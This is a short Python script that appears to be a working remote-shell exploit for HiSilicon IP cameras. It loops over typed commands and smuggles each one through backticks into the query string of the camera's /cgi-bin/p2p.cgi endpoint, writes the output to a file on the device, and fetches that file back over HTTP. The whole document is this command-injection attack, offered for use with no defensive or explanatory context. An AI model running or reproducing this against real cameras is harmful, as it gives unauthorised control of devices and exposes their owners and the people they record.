import requests
from argparse import ArgumentParser

parser = ArgumentParser("Shell wrapper for hisilicon ipcamera")
parser.add_argument("ip")
args = parser.parse_args()

CMD_URL="http://{ip}/cgi-bin/p2p.cgi?`{cmd} 2>&1 > /tmpfs/ipcamera.conf `"
READ_URL="http://{ip}/tmpfs/ipcamera.conf".format(ip=args.ip)

def main():
    while True:
        cmd = input("$ ")
        requests.get(CMD_URL.format(ip=args.ip, cmd=cmd))
        output = requests.get(READ_URL).text
        
        print(output)

if __name__ == "__main__":
    main()
